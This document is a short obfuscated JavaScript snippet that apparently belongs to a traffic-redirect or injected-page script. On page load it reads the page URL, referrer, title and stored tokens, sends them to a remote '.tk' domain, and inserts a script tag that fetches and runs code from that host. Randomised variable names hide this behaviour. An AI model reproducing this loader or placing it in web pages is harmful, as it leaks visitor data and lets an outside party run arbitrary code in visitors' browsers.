  (function() {
    var name = '_9m9Fv3Wb27N24HhW';
    if (!window._9m9Fv3Wb27N24HhW) {
        window._9m9Fv3Wb27N24HhW = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _9gv2nqvsjh61zRRD = localStorage.getItem('config');
    if (typeof _9gv2nqvsjh61zRRD !== 'undefined' && _9gv2nqvsjh61zRRD !== null) {
        var _LShrLPjvH51qXwCY = JSON.parse(_9gv2nqvsjh61zRRD);
        var _Vf9ZmpqCmNLNMQbQ = Math.round(+new Date()/1000);
        if (_LShrLPjvH51qXwCY.created_at + window._9m9Fv3Wb27N24HhW.ttl < _Vf9ZmpqCmNLNMQbQ) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _wqpRW5dpXRkKYQxp = localStorage.getItem('subId');
    var _BMM1yvqrW2Ng5WxN = localStorage.getItem('token');
    var _HXFDDLLhS7RtPRGK = '?return=js.client';
        _HXFDDLLhS7RtPRGK += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _HXFDDLLhS7RtPRGK += '&se_referrer=' + encodeURIComponent(document.referrer);
        _HXFDDLLhS7RtPRGK += '&default_keyword=' + encodeURIComponent(document.title);
        _HXFDDLLhS7RtPRGK += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _HXFDDLLhS7RtPRGK += '&name=' + encodeURIComponent(name);
        _HXFDDLLhS7RtPRGK += '&host=' + encodeURIComponent(window._9m9Fv3Wb27N24HhW.R_PATH);
    if (typeof _wqpRW5dpXRkKYQxp !== 'undefined' && _wqpRW5dpXRkKYQxp && window._9m9Fv3Wb27N24HhW.unique) {
        _HXFDDLLhS7RtPRGK += '&sub_id=' + encodeURIComponent(_wqpRW5dpXRkKYQxp);
    }
    if (typeof _BMM1yvqrW2Ng5WxN !== 'undefined' && _BMM1yvqrW2Ng5WxN && window._9m9Fv3Wb27N24HhW.unique) {
        _HXFDDLLhS7RtPRGK += '&token=' + encodeURIComponent(_BMM1yvqrW2Ng5WxN);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._9m9Fv3Wb27N24HhW.R_PATH + _HXFDDLLhS7RtPRGK;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
